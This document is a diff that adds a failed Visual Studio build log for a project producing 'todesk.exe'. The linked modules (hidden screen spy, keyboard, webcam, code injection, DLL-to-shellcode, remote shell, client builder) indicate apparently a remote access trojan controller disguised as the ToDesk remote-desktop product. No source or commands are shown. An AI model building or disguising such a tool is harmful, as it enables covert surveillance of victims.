@@ -1,0 +1,82 @@
+﻿Build started 2025/7/26 17:51:16.
+     1>Project "D:\paidone\todesk\主控\Quick\Quick.vcxproj" on node 2 (build target(s)).
+     1>InitializeBuildStatus:
+         Touching "Release\todesk.unsuccessfulbuild".
+       ClCompile:
+         All outputs are up-to-date.
+         All outputs are up-to-date.
+       ResourceCompile:
+         C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\bin\rc.exe /D NDEBUG /D _UNICODE /D UNICODE /l"0x0409" /IRelease\ /nologo /fo"Release\Quick.res" Quick.rc 
+       Link:
+         C:\Program Files (x86)\Microsoft Visual Studio 10.0\VC\bin\link.exe /ERRORREPORT:PROMPT /OUT:"D:\paidone\todesk\主控\Release\todesk.exe" /INCREMENTAL:NO /NOLOGO /MANIFEST /ManifestFile:"Release\todesk.exe.intermediate.manifest" /MANIFESTUAC:"level='asInvoker' uiAccess='false'" /DEBUG /PDB:"D:\paidone\todesk\主控\Release\todesk.pdb" /SUBSYSTEM:WINDOWS /OPT:REF /OPT:ICF /LTCG /TLBID:1 /ENTRY:"wWinMainCRTStartup" /DYNAMICBASE /NXCOMPAT /IMPLIB:"D:\paidone\todesk\主控\Release\todesk.lib" /MACHINE:X86 Release\Quick.res
+         Release\AudioCode.obj
+         Release\BmpToAvi.obj
+         Release\Buffer.obj
+         Release\CFileListCtrl.obj
+         Release\InjectCodeDlg.obj
+         Release\KernelDlg.obj
+         Release\HpTcpServer.obj
+         Release\HpUdpServer.obj
+         Release\ipc.obj
+         Release\ISocketBase.obj
+         Release\LockDlg.obj
+         Release\LogView.obj
+         Release\MainFrm.obj
+         Release\md5.obj
+         Release\MemoryModule.obj
+         Release\ProxyMapDlg.obj
+         Release\QuickScreenSpyDlg.obj
+         Release\SEU_QQwry.obj
+         Release\SoundToWav.h.obj
+         Release\stdafx.obj
+         Release\TipCtrl.obj
+         Release\TipfileCtrl.obj
+         Release\TKYLockRW.obj
+         Release\WaveIn.obj
+         Release\WaveOut.obj
+         Release\WavePlayback.obj
+         Release\WaveRecord.obj
+         Release\Quick.obj
+         Release\QuickDoc.obj
+         Release\QuickView.obj
+         Release\ShellDlg.obj
+         Release\Chat.obj
+         Release\FileManagerDlg.obj
+         Release\FileTransferModeDlg.obj
+         Release\InputDlg.obj
+         Release\LFileName.obj
+         Release\RegeditDlg.obj
+         Release\RegeditTextDlg.obj
+         Release\SpeakerDlg.obj
+         Release\AudioRender.obj
+         Release\AudioCapture.obj
+         Release\WebCamDlg.obj
+         Release\MovieMaker.obj
+         Release\BuildDlg.obj
+         Release\AudioDlg.obj
+         Release\DifScreenSpyDlg.obj
+         Release\BmpToAvidif.obj
+         Release\ExpandDlg.obj
+         Release\ServiceInfoDlg.obj
+         Release\KeyBoardDlg.obj
+         Release\MachineDlg.obj
+         Release\HideScreenSpyDlg.obj
+         Release\CTextDlg.obj
+         Release\DllToShellCode.obj
+         Release\H264ScreenSpyDlg.obj
+         Release\LocalUpload.obj
+         Release\PlugView.obj
+         Release\XvidDec.obj
+         Release\ProxyConnectServer.obj
+         Release\LOGIN.obj
+         Release\TabView.obj
+         Release\ScreenMonitorDlg.obj
+         Release\CCreateTaskDlg.obj
+         Release\ChangeGroupDlg.obj
+         Release\CopyClientDlg.obj
+     1>LINK : fatal error LNK1104: cannot open file 'ToolkitPro1850vc100SU.lib'
+     1>Done Building Project "D:\paidone\todesk\主控\Quick\Quick.vcxproj" (build target(s)) -- FAILED.
+
+Build FAILED.
+
+Time Elapsed 00:00:05.76
